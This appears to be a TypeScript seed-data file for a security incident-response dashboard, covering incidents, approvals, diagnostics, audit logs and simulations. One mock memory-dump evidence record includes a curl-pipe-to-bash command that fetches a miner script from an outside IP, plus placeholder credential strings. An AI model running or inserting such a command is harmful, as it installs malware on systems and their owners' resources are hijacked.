    source: 'Okta System Log API',
    collectedBy: 'Elena Rostova',
    collectionTimestamp: '2026-09-30T14:38:00Z',
    hash: generateHash('EVD-103-okta-auth-log'),
    hashVerified: true,
    chainOfCustody: [
      { timestamp: '2026-09-30T14:38:00Z', action: 'Exported from Okta SIEM connector', user: 'Elena Rostova', details: 'Automated ingest into investigation ticket' }
    ],
    redacted: true,
    fileSize: '3.1 KB'
  },
  {
    id: 'EVD-104',
    incidentId: 'INC-2026-0895',
    title: 'Volatile Memory Process String Dump & C2 Artifacts',
    type: 'diagnostic_output',
    description: 'Forensic memory capture extraction showing hidden binary strings and socket descriptors.',
    content: `--- PROCESS MEMORY FORENSICS (PID 4410: /tmp/.hidden_kswapd) ---
Executable Path: /tmp/.hidden_kswapd (Deleted from filesystem)
Parent PID: 1 (init/containerd-shim)
Network Connection: 10.244.4.12:44192 -> 185.220.101.5:2222 (ESTABLISHED)
Extracted String Artifacts:
  - "SSH-2.0-Adversary-C2-Drop"
  - "AWS_SECRET_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE"
  - "-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA0Z9w2g...[CONFIDENTIAL_KEY_BLOCK]...
-----END RSA PRIVATE KEY-----"
  - "sh -c curl -s http://185.220.101.5/miner.sh | bash"
MD5: 44b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5
SHA256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855`,
    source: 'k8s-worker-node-04 [VPC Subnet B]',
    collectedBy: 'Elena Rostova',
    collectionTimestamp: '2026-09-30T13:35:00Z',
    hash: generateHash('EVD-104-c2-memory-dump'),
    hashVerified: true,
    chainOfCustody: [
      { timestamp: '2026-09-30T13:35:00Z', action: 'Volatile memory acquired via LiME forensic module', user: 'Elena Rostova', details: 'Zero write to host storage verified' },
      { timestamp: '2026-09-30T13:40:00Z', action: 'Sealed into evidence repository', user: 'Elena Rostova', details: 'Tamper evident seal verified' }
    ],
    redacted: true,
    fileSize: '8.4 KB'
  }
];

export const INITIAL_TASKS: ResponseTask[] = [
  {
    id: 'TSK-501',
    incidentId: 'INC-2026-0891',
    title: 'Run Diagnostic Thread Dump on Payment Service Pods',
    description: 'Trigger safe read-only JVM thread dump on payment-gw-prod-01 to diagnose stuck HTTP handler threads.',
    assignedTo: 'David Chen',
    assignedToAvatar: 'https://images.unsplash.com/photo-1500648767791-00dcc994a43e?w=120&auto=format&fit=crop&q=80',
    priority: 'P1 - Urgent',
    status: 'In Progress',
    dueTime: '2026-09-30T15:30:00Z',
    createdTime: '2026-09-30T14:50:00Z',
    approvalRequired: false
  },
  {
    id: 'TSK-502',
    incidentId: 'INC-2026-0891',
    title: 'Request Approval for Edge Rate-Limiting Filter on /v1/checkout',
    description: 'Apply dynamic token bucket rate-limiting at Cloudflare edge to throttle abusive client IP range 45.154.255.0/24.',
    assignedTo: 'Marcus Vance',
    assignedToAvatar: 'https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=120&auto=format&fit=crop&q=80',
    priority: 'P1 - Urgent',
    status: 'Awaiting Approval',
    dueTime: '2026-09-30T15:15:00Z',
    createdTime: '2026-09-30T14:52:00Z',
    approvalRequired: true,
    approvalRequestId: 'APR-201'
  },
  {
    id: 'TSK-503',
    incidentId: 'INC-2026-0891',
    title: 'Scale Up Payment Pod Replicas from 4 to 12',
    description: 'Increase horizontal pod autoscaler minimum replicas to alleviate socket backlog.',
    assignedTo: 'David Chen',
    priority: 'P2 - High',
    status: 'Pending',
    dueTime: '2026-09-30T15:45:00Z',
    createdTime: '2026-09-30T14:55:00Z',
    approvalRequired: true,
    approvalRequestId: 'APR-202'
  },
  {
    id: 'TSK-504',
    incidentId: 'INC-2026-0892',
    title: 'Audit Locked User Accounts for Compromise Evidence',
    description: 'Review Okta event records for 18 locked accounts to confirm zero successful token issues occurred.',
    assignedTo: 'Elena Rostova',
    priority: 'P1 - Urgent',
    status: 'In Progress',
    dueTime: '2026-09-30T15:30:00Z',
    createdTime: '2026-09-30T14:35:00Z',
    approvalRequired: false
  },
  {
    id: 'TSK-505',
    incidentId: 'INC-2026-0892',
    title: 'Deploy WAF Bot Management Challenge for Autonomous ASN 14061',
    description: 'Enable Cloudflare Turnstile JavaScript challenge for high-risk ASN traffic targeting login endpoints.',
    assignedTo: 'Elena Rostova',
    priority: 'P1 - Urgent',
    status: 'Completed',
    dueTime: '2026-09-30T14:50:00Z',
    createdTime: '2026-09-30T14:36:00Z',
    completionTime: '2026-09-30T14:48:00Z',
    approvalRequired: true,
    approvalRequestId: 'APR-203'
  },
  {
    id: 'TSK-506',
    incidentId: 'INC-2026-0893',
    title: 'Terminate Long-Running Exclusive Lock on Table orders_v2',
    description: 'Kill PID 4491 holding ExclusiveLock to unfreeze pending write transactions.',
    assignedTo: 'David Chen',
    priority: 'P1 - Urgent',
    status: 'Awaiting Approval',
    dueTime: '2026-09-30T15:10:00Z',
    createdTime: '2026-09-30T14:28:00Z',
    approvalRequired: true,
    approvalRequestId: 'APR-204'
  },
  {
    id: 'TSK-507',
    incidentId: 'INC-2026-0895',
    title: 'Quarantine Worker Node k8s-04 via VPC Security Group',
    description: 'Apply isolated quarantine security group to sever all ingress and egress except management bastion.',
    assignedTo: 'Elena Rostova',
    priority: 'P1 - Urgent',
    status: 'Completed',
    dueTime: '2026-09-30T13:45:00Z',
    createdTime: '2026-09-30T13:20:00Z',
    completionTime: '2026-09-30T13:30:00Z',
    approvalRequired: true,
    approvalRequestId: 'APR-205'
  }
];

export const INITIAL_APPROVALS: ApprovalRequest[] = [
  {
    id: 'APR-201',
    incidentId: 'INC-2026-0891',
    incidentTitle: 'Critical Gateway Latency & 504 Storm on Payment API',
    actionTitle: 'Enforce Edge Rate Limiting on IP Subnet 45.154.255.0/24',
    requestedAction: 'Apply Cloudflare WAF rate limiting rule (limit: 5 req/min) across payment API path.',
    requestedBy: 'AI Copilot Recommendation & David Chen',
    aiRecommendationSource: 'Diagnostic Action #DIA-101 (Approved Runbook RBK-01 Step 3)',
    riskLevel: 'Medium',
    reason: 'Traffic analysis demonstrates anomalous client volume from ASN 14061 exhausting Envoy ingress socket limits.',
    requiredPermission: 'approve_actions',
    createdTime: '2026-09-30T14:52:00Z',
    expirationTime: '2026-09-30T16:52:00Z',
    status: 'Pending'
  },
  {
    id: 'APR-202',
    incidentId: 'INC-2026-0891',
    incidentTitle: 'Critical Gateway Latency & 504 Storm on Payment API',
    actionTitle: 'Scale Up Payment Pod Replicas from 4 to 12',
    requestedAction: 'kubectl scale deployment payment-gateway --replicas=12 -n production',
    requestedBy: 'David Chen',
    aiRecommendationSource: 'Approved Runbook RBK-01 Step 4',
    riskLevel: 'Medium',
    reason: 'Alleviate CPU throttling and pending queue connections during high volume checkout period.',
    requiredPermission: 'approve_actions',
    createdTime: '2026-09-30T14:55:00Z',
    expirationTime: '2026-09-30T16:55:00Z',
    status: 'Pending'
  },
  {
    id: 'APR-204',
    incidentId: 'INC-2026-0893',
    incidentTitle: 'PostgreSQL Primary Connection Exhaustion & Lock Contention',
    actionTitle: 'Terminate Blocked Transaction PID 4491 via pg_terminate_backend()',
    requestedAction: 'SELECT pg_terminate_backend(4491); on PostgreSQL Primary Cluster.',
    requestedBy: 'David Chen',
    aiRecommendationSource: 'Approved Runbook RBK-02 Step 3',
    riskLevel: 'High',
    reason: 'PID 4491 has held an ExclusiveLock for >24 minutes, blocking 140 incoming customer writes.',
    requiredPermission: 'approve_actions',
    createdTime: '2026-09-30T14:28:00Z',
    expirationTime: '2026-09-30T15:28:00Z',
    status: 'Pending'
  },
  {
    id: 'APR-205',
    incidentId: 'INC-2026-0895',
    incidentTitle: 'Anomalous Outbound C2 Beaconing on Worker Node k8s-04',
    actionTitle: 'Isolate Host k8s-worker-node-04 in Quarantine Security Group',
    requestedAction: 'Modify AWS ENI security group attachment to sg-04forensics-quarantine.',
    requestedBy: 'Elena Rostova',
    aiRecommendationSource: 'Approved Runbook RBK-04 Step 2',
    riskLevel: 'Critical',
    reason: 'Immediate network quarantine required to disrupt active C2 beaconing while preserving volatile memory.',
    requiredPermission: 'approve_actions',
    createdTime: '2026-09-30T13:22:00Z',
    expirationTime: '2026-09-30T14:22:00Z',
    status: 'Approved',
    reviewedBy: 'Marcus Vance',
    reviewTimestamp: '2026-09-30T13:25:00Z',
    reviewComment: 'Approved immediately under emergency containment protocol. Volatile memory capture confirmed first.'
  }
];

export const INITIAL_DIAGNOSTICS: DiagnosticRecommendation[] = [
  {
    id: 'DIA-101',
    incidentId: 'INC-2026-0891',
    actionName: 'Inspect Envoy Ingress Socket & Upstream Error Metrics',
    description: 'Query Envoy proxy admin endpoint (/stats/prometheus) to verify socket allocation and backlog queue depth.',
    whyRecommended: 'Identifies whether failure originates in ingress proxy connection saturation or downstream microservice crash.',
    expectedInformationGain: 'Pinpoints upstream cluster timeouts and TCP socket exhaustion status.',
    riskLevel: 'Low',
    requiredPermission: 'view_evidence',
    approvalRequired: false,
    status: 'Executed',
    executionResult: 'Sockets: 8,420 total. Ingress queue limit reached. Upstream pods returning 504 to Envoy.',
    createdAt: '2026-09-30T14:49:00Z'
  },
  {
    id: 'DIA-102',
    incidentId: 'INC-2026-0891',
    actionName: 'Compare Current Checkout Traffic to 14-Day Baseline',
    description: 'Run statistical anomaly comparison of incoming RPS vs 14-day rolling mean.',
    whyRecommended: 'Determines whether the 504 storm is driven by legitimate flash crowd or distributed volumetric attack.',
    expectedInformationGain: 'Traffic volume is 2.8x standard baseline with 92% concentration from ASN 14061.',
    riskLevel: 'Low',
    requiredPermission: 'view_evidence',
    approvalRequired: false,
    status: 'Executed',
    executionResult: 'Statistical divergence confirmed: +280% RPS anomaly detected.',
    createdAt: '2026-09-30T14:50:00Z'
  },
  {
    id: 'DIA-103',
    incidentId: 'INC-2026-0891',
    actionName: 'Simulate Edge Rate-Limiting Rule on Subnet 45.154.255.0/24',
    description: 'Deploy mock Cloudflare WAF token bucket throttling to shield payment gateway API.',
    whyRecommended: 'Safely mitigates upstream queue saturation without altering core application code or persistence.',
    expectedInformationGain: 'Expected 75% reduction in ingress queue load within 60 seconds.',
    riskLevel: 'Medium',
    requiredPermission: 'approve_actions',
    approvalRequired: true,
    status: 'Approval Requested',
    createdAt: '2026-09-30T14:52:00Z'
  },
  {
    id: 'DIA-104',
    incidentId: 'INC-2026-0893',
    actionName: 'Sample Active Long-Running Queries via pg_stat_activity',
    description: 'Execute read-only query on PostgreSQL internal catalog to inspect queries in active state > 30s.',
    whyRecommended: 'Isolates the exact SQL query and transaction holding row-level locks on orders table.',
    expectedInformationGain: 'Revealed PID 4491 running unindexed reporting scan with ExclusiveLock.',
    riskLevel: 'Low',
    requiredPermission: 'view_evidence',
    approvalRequired: false,
    status: 'Executed',
    executionResult: 'Found query: SELECT * FROM orders_v2 WHERE created_at < NOW() FOR UPDATE (PID 4491).',
    createdAt: '2026-09-30T14:22:00Z'
  }
];

export const INITIAL_TIMELINE: TimelineEvent[] = [
  {
    id: 'EVT-01',
    timestamp: '2026-09-30T14:48:00Z',
    type: 'alert_trigger',
    title: 'Cloudflare Ingress Alert ALT-9041 Fired',
    description: 'Repeated HTTP 504 Gateway Timeouts detected on payment gateway service.',
    actor: 'Cloudflare Telemetry'
  },
  {
    id: 'EVT-02',
    timestamp: '2026-09-30T14:49:00Z',
    type: 'commander_assigned',
    title: 'Incident Commander Marcus Vance Assumed Role',
    description: 'Marcus Vance assigned as primary commander for INC-2026-0891.',
    actor: 'Marcus Vance'
  },
  {
    id: 'EVT-03',
    timestamp: '2026-09-30T14:50:00Z',
    type: 'ai_recommendation',
    title: 'AI Copilot Synthesized Incident Blast Radius',
    description: 'Copilot generated preliminary impact analysis and matched Approved Runbook RBK-01.',
    actor: 'AI Copilot'
  },
  {
    id: 'EVT-04',
    timestamp: '2026-09-30T14:52:00Z',
    type: 'evidence_added',
    title: 'Envoy Access Logs EVD-101 Added with Secrets Redacted',
    description: 'Log sample uploaded to evidence repository; API key and DB password masked automatically.',
    actor: 'Elena Rostova'
  },
  {
    id: 'EVT-05',
    timestamp: '2026-09-30T14:54:00Z',
    type: 'approval_granted',
    title: 'Approval Request APR-201 Created',
    description: 'Approval requested for Edge rate limiting on /v1/checkout path.',
    actor: 'David Chen'
  }
];

export const INITIAL_AUDIT_LOGS: AuditLogEntry[] = [
  {
    id: 'AUD-8801',
    timestamp: '2026-09-30T14:55:00Z',
    user: 'David Chen',
    role: 'Responder',
    action: 'APPROVAL_REQUEST_SUBMITTED',
    resource: 'ApprovalCenter / APR-201',
    incidentId: 'INC-2026-0891',
    ipAddress: '10.20.4.11',
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) SecOpsConsole/2.4',
    result: 'Success',
    previousStateHash: generateHash('state-genesis-001'),
    currentStateHash: generateHash('state-genesis-002'),
    details: 'Submitted approval request for rate limiting action on IP range 45.154.255.0/24.'
  },
  {
    id: 'AUD-8802',
    timestamp: '2026-09-30T14:52:00Z',
    user: 'Elena Rostova',
    role: 'Security Analyst',
    action: 'EVIDENCE_COLLECTED_AND_REDACTED',
    resource: 'EvidenceManager / EVD-101',
    incidentId: 'INC-2026-0891',
    ipAddress: '10.20.4.14',
    userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) SecOpsConsole/2.4',
    result: 'Success',
    previousStateHash: generateHash('state-genesis-002'),
    currentStateHash: generateHash('state-genesis-003'),
    details: 'Captured Envoy ingress log. 2 sensitive tokens automatically detected and redacted.'
  },
  {
    id: 'AUD-8803',
    timestamp: '2026-09-30T14:50:00Z',
    user: 'AI Copilot Engine',
    role: 'Viewer',
    action: 'AI_SYNTHESIS_AND_RECOMMENDATION_GENERATED',
    resource: 'IncidentCopilot / INC-2026-0891',
    incidentId: 'INC-2026-0891',
    ipAddress: '127.0.0.1 (Internal Service)',
    userAgent: 'AICopilotDaemon/1.0',
    result: 'Success',
    previousStateHash: generateHash('state-genesis-003'),
    currentStateHash: generateHash('state-genesis-004'),
    details: 'Generated incident summary and recommended diagnostic steps from Approved Runbook RBK-01.'
  },
  {
    id: 'AUD-8804',
    timestamp: '2026-09-30T13:25:00Z',
    user: 'Marcus Vance',
    role: 'Incident Commander',
    action: 'EMERGENCY_APPROVAL_GRANTED',
    resource: 'ApprovalCenter / APR-205',
    incidentId: 'INC-2026-0895',
    ipAddress: '10.20.4.9',
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) SecOpsConsole/2.4',
    result: 'Success',
    previousStateHash: generateHash('state-genesis-004'),
    currentStateHash: generateHash('state-genesis-005'),
    details: 'Granted emergency quarantine approval for compromised host k8s-worker-node-04.'
  },
  {
    id: 'AUD-8805',
    timestamp: '2026-09-30T13:20:00Z',
    user: 'Sarah Connor',
    role: 'Admin',
    action: 'USER_ROLE_UPDATED',
    resource: 'UserManagement / usr-4',
    incidentId: undefined,
    ipAddress: '10.20.4.2',
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) SecOpsConsole/2.4',
    result: 'Success',
    previousStateHash: generateHash('state-genesis-005'),
    currentStateHash: generateHash('state-genesis-006'),
    details: 'Assigned Responder role permissions to David Chen (SRE team).'
  }
];

export const INITIAL_INTEGRATIONS: Integration[] = [
  {
    id: 'int-1',
    name: 'Datadog APM & Metrics',
    type: 'Monitoring System',
    status: 'Connected',
    lastEventTime: '2026-09-30T15:02:00Z',
    eventsReceivedCount: 14290,
    webhookUrl: 'https://api.cyberops.corp/webhooks/v1/datadog-ingest',
    secretMasked: 'whsec_99a812************',
    enabled: true,
    description: 'Receives infrastructure APM traces, error threshold warnings, and host health telemetry.'
  },
  {
    id: 'int-2',
    name: 'Splunk Enterprise SIEM',
    type: 'SIEM',
    status: 'Connected',
    lastEventTime: '2026-09-30T15:04:00Z',
    eventsReceivedCount: 48920,
    webhookUrl: 'https://api.cyberops.corp/webhooks/v1/splunk-events',
    secretMasked: 'splk_live_4490************',
    enabled: true,
    description: 'Central security information and correlation engine forwarding critical security alerts.'
  },
  {
    id: 'int-3',
    name: 'AWS GuardDuty & SecurityHub',
    type: 'Cloud Platform',
    status: 'Connected',
    lastEventTime: '2026-09-30T14:45:00Z',
    eventsReceivedCount: 1104,
    webhookUrl: 'https://api.cyberops.corp/webhooks/v1/aws-guardduty',
    secretMasked: 'aws_sig_3921************',
    enabled: true,
    description: 'Cloud environment threat detection analyzing CloudTrail management events and VPC flow logs.'
  },
  {
    id: 'int-4',
    name: 'Slack #secops-war-room',
    type: 'Slack',
    status: 'Connected',
    lastEventTime: '2026-09-30T15:05:00Z',
    eventsReceivedCount: 3820,
    webhookUrl: 'https://hooks.slack.com/services/T00/B00/secops-dispatch',
    secretMasked: 'xoxb-991204************',
    enabled: true,
    description: 'Real-time broadcast channel for high-priority incidents, approval requests, and resolution updates.'
  },
  {
    id: 'int-5',
    name: 'Microsoft Teams Emergency Ops',
    type: 'Microsoft Teams',
    status: 'Degraded',
    lastEventTime: '2026-09-30T12:20:00Z',
    eventsReceivedCount: 840,
    webhookUrl: 'https://outlook.office.com/webhook/secops-msteams',
    secretMasked: 'msteams_sec_************',
    enabled: false,
    description: 'Secondary incident broadcasting channel for cross-departmental executive leadership.'
  },
  {
    id: 'int-6',
    name: 'Jira Enterprise Security Desk',
    type: 'Ticketing System',
    status: 'Connected',
    lastEventTime: '2026-09-30T14:58:00Z',
    eventsReceivedCount: 2940,
    webhookUrl: 'https://cyberops.atlassian.net/rest/api/3/webhook',
    secretMasked: 'jira_tok_9912************',
    enabled: true,
    description: 'Bi-directional synchronization of incident tasks, remediation tickets, and post-mortem items.'
  },
  {
    id: 'int-7',
    name: 'PagerDuty On-Call Escalation',
    type: 'Email Alerting',
    status: 'Connected',
    lastEventTime: '2026-09-30T14:48:00Z',
    eventsReceivedCount: 512,
    webhookUrl: 'https://events.pagerduty.com/v2/enqueue',
    secretMasked: 'pd_service_ky_************',
    enabled: true,
    description: 'Automated on-call rotation paging for Critical severity incidents.'
  }
];

export const INITIAL_SIMULATIONS: SimulationScenario[] = [
  {
    id: 'sim-01',
    name: 'Distributed API Outage & Latency Spike',
    category: 'Application',
    description: 'Simulate high ingress volume causing Envoy proxy timeouts (504 storm) across core customer APIs.',
    severity: 'Critical',
    symptoms: [
      'P99 latency increases from 80ms to 11,500ms',
      'HTTP 504 error rate spikes to 42%',
      'Worker pool socket exhaustion on payment gateway'
    ],
    mockAlerts: [
      { title: 'Simulated Ingress 504 Gateway Timeout Spike', source: 'Envoy Ingress Telemetry', severity: 'Critical' },
      { title: 'Simulated Downstream Service Queue Congestion', source: 'Datadog APM', severity: 'High' }
    ],
    steps: [
      'Select Simulation Scenario',
      'Confirm Environment Guardrails (Sandbox Isolated)',
      'Trigger Mock High-Traffic Influx',
      'Generate Correlated Telemetry & Alert Stream',
      'Create Simulated Incident Ticket',
      'AI Copilot Synthesizes Root Cause',
      'Review Diagnostic Recommendations',
      'Require Human Approval for Mitigation',
      'Simulate Edge Rate-Limiting Execution',
      'Verify Simulated Incident Resolution'
    ],
    expectedDiagnostics: [
      { actionName: 'Inspect Ingress Sockets & Socket Queue', risk: 'Low', rationale: 'Verify where packet buffer queue is stalling.' },
      { actionName: 'Enable Edge Rate Limiting on Abusive Subnet', risk: 'Medium', rationale: 'Quarantine volumetric traffic spike.' }
    ]
  },
  {
    id: 'sim-02',
    name: 'PostgreSQL Database Connection Pool Exhaustion',
    category: 'Database',
    description: 'Simulate database lock contention holding exclusive locks and driving active connections to 99%.',
    severity: 'High',
    symptoms: [
      'Active backend connections climb to 990 / 1000',
      'Query wait times exceed 20 seconds',
      'PgBouncer queue depth escalates rapidly'
    ],
    mockAlerts: [
      { title: 'Simulated PostgreSQL Connection Pool 98% Full', source: 'Datadog DB Monitoring', severity: 'High' },
      { title: 'Simulated Blocked Query Count Exceeded Threshold', source: 'PostgreSQL Exporter', severity: 'High' }
    ],
    steps: [
      'Select Simulation Scenario',
      'Inject Simulated Hanging Analytical Query',
      'Observe Connection Saturation in Live Stream',
      'Launch AI Copilot Diagnostic Review',
      'Recommend pg_terminate_backend Execution',
      'Require Incident Commander Sign-off',
      'Execute Mock Query Termination',
      'Observe Connection Pool Recovery'
    ],
    expectedDiagnostics: [
      { actionName: 'Inspect Active Locks via pg_stat_activity', risk: 'Low', rationale: 'Find the blocker PID.' },
      { actionName: 'Terminate Blocked Transaction via pg_terminate_backend', risk: 'High', rationale: 'Unfreeze table locks.' }
    ]
  },
  {
    id: 'sim-03',
    name: 'Distributed Credential Stuffing & Brute Force',
    category: 'Authentication',
    description: 'Simulate automated botnet rotating leaked user passwords across identity endpoints.',
    severity: 'Critical',
    symptoms: [
      '10,000+ failed login events in 5 minutes',
      'High distinct IP rotation (>300 subnets)',
      'Account lockout alerts firing across support desk'
    ],
    mockAlerts: [
      { title: 'Simulated High-Volume Failed Authentication Surge', source: 'Okta Identity SIEM', severity: 'Critical' },
      { title: 'Simulated Anomalous ASN Rotation Pattern', source: 'Cloudflare WAF', severity: 'High' }
    ],
    steps: [
      'Select Scenario & Launch Simulation',
      'Generate Credential Stuffing Alert Telemetry',
      'AI Copilot Flags Leaked Credential Patterns',
      'Suggest Mandatory Step-Up Hardware Token MFA',
      'Commander Evaluates Risk and Approves Policy',
      'Apply Simulated WAF Bot Mitigation Rule',
      'Audit Resolution in Tamper-Evident Ledger'
    ],
    expectedDiagnostics: [
      { actionName: 'Aggregate ASN & Geolocation Dispersion', risk: 'Low', rationale: 'Map proxy origins.' },
      { actionName: 'Deploy Edge Turnstile Challenge Rule', risk: 'Medium', rationale: 'Stop automated scrapers.' }
    ]
  },
  {
    id: 'sim-04',
    name: 'Worker Node Malware Beaconing / Unauthorized Tunnel',
    category: 'Infrastructure',
    description: 'Simulate an isolated host executing anomalous outbound encrypted traffic to test containment workflows.',
    severity: 'Critical',
    symptoms: [
      'Outbound SSH traffic to unknown external port 2222',
      'Suspicious binary spawned from /tmp directory',
      'CrowdStrike Falcon behavioral anomaly trigger'
    ],
    mockAlerts: [
      { title: 'Simulated C2 Beaconing Signature Match', source: 'CrowdStrike Falcon', severity: 'Critical' },
      { title: 'Simulated Volatile Memory Anomaly Detected', source: 'Suricata NIDS', severity: 'Critical' }
    ],
    steps: [
      'Launch Malicious Beaconing Simulation',
      'Inspect Mock Memory Dump Evidence',
      'AI Recommends Immediate Isolation',
      'Human Commander Confirms Containment',
      'Simulate VPC Security Group Quarantine',
      'Verify Safe Resolution and Audit Chain'
    ],
    expectedDiagnostics: [
      { actionName: 'Acquire Volatile Memory Snapshot', risk: 'Low', rationale: 'Capture volatile evidence.' },
      { actionName: 'Apply Security Group Quarantine Isolation', risk: 'Critical', rationale: 'Sever lateral threat path.' }
    ]
  }
];

export const INITIAL_LIVE_EVENTS: LiveEvent[] = [
  {
    id: 'levt-01',
    timestamp: '2026-09-30T15:05:00Z',
    category: 'incident',
    severity: 'Critical',
    title: 'Incident INC-2026-0891 Status: Investigating',
    description: 'Commander Marcus Vance reviewing Envoy socket diagnostic output.',
    source: 'CSIRT Console',
    incidentId: 'INC-2026-0891'
  },
  {
    id: 'levt-02',
    timestamp: '2026-09-30T15:02:00Z',
    category: 'webhook',
    severity: 'Informational',
    title: 'Webhook Received: Datadog APM',
    description: 'Ingress metric payload received for payment-gateway cluster (200 OK).',
    source: 'Datadog Ingest'
  },
  {
    id: 'levt-03',
    timestamp: '2026-09-30T14:58:00Z',
    category: 'approval',
    severity: 'High',
    title: 'Approval Request Pending: APR-201',
    description: 'Rate-limiting filter on IP range 45.154.255.0/24 awaiting sign-off.',
    source: 'Approval Center',
    incidentId: 'INC-2026-0891'
  },
  {
    id: 'levt-04',
    timestamp: '2026-09-30T14:52:00Z',
    category: 'evidence',
    severity: 'Medium',
    title: 'Evidence Added: EVD-101 (Redacted)',
    description: 'Envoy access log uploaded with 2 sensitive credentials masked.',
    source: 'Evidence Manager',
    incidentId: 'INC-2026-0891'
  },
  {
    id: 'levt-05',
    timestamp: '2026-09-30T14:48:00Z',
    category: 'alert',
    severity: 'Critical',
    title: 'Alert ALT-9041 Triggered',
    description: 'Repeated HTTP 504 Gateway Timeouts on Core Payment API.',
    source: 'Cloudflare WAF',
    incidentId: 'INC-2026-0891'
  }
];
